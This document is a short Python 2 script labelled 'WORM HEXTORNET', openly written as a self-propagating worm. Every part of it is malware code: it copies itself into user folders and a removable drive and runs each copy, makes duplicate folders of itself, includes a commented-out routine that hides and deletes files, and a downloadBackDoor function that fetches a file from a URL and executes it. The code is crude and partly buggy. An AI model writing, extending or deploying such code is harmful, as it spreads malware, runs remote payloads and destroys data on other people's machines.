#!/usr/bin/env python

from shutil import copyfile
import os, getpass
from sys import argv
#import win32con, win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil

"""
[==========================]
+                          +
+     WORM HEXTORNET       +
+                          +
[==========================]
"""

"""
	if(os.path.isdir("E:\\")):
		dst = "E:" + "\\hextornet.py"

	#checks for C:/ drive on windows
	elif(os.path.isdir("C:\\")):
		dst = "C:\\Users\\" + usr + "\\hextornet.py"
"""

src = os.path.abspath("hextornet.py")
usr = getpass.getuser()

def propagate():

	directoriesLinux = ["Documents", "Downloads", "Music", "Pictures", "Videos"]

	dst=""

	if(os.path.isdir("E:\\")):
		dst = "E:" + "\\hextornet.py"

	#Propagate worn in all directories
	for directory in directoriesLinux:
		if(os.path.isdir("/" + usr + "/" + directory + "/")):
			dst = "/" + usr + "/" + directory + "/" + "hextornet.py"
		else:
			dst = os.getcwd() + "hextornet.py"
	
        copyfile(src, dst)
	run(dst)
	print("Worm location")
	print("dst:", dst)
	print("src:", src)

def copy():
	script = sys.argv
	name = str(script[0])
	b = os.path.getsize(os.path.abspath("/root")) #Change in windows
	for i in range(0, 4):
		directoryName = "files_" + str(i)
		try:
			os.makedirs(directoryName, 0755)
			shutil.copy(name, directoryName)
			src = os.path.abspath(directoryName)
		except OSError as e:
			os.chmod(directoryName, 0755)

"""
def hide():
        for fname in os.listdir('.'):
                if fname.find('.py') == len(fname) - len('.py'):
                        #make the file hidden
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
                elif fname.find('.txt') == len(fname) - len('.txt'):
                        #make the file read only
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
                else:
                        #to force deletion of a file set it to normal
                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
			os.remove(fname)

"""

def downloadBackDoor(url):
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	content = urlopen(url).read()
        outfile = open(filename, "wb")
        outfile.write(content)
        outfile.close()
        run(os.path.abspath(filename))

def run(program):
	process = sp.Popen(program, shell=True)
	process.wait()

def main():
	copy()
	#hide()
	propagate()
	#downloadBackDoor("")

if __name__ == "__main__":
	main()
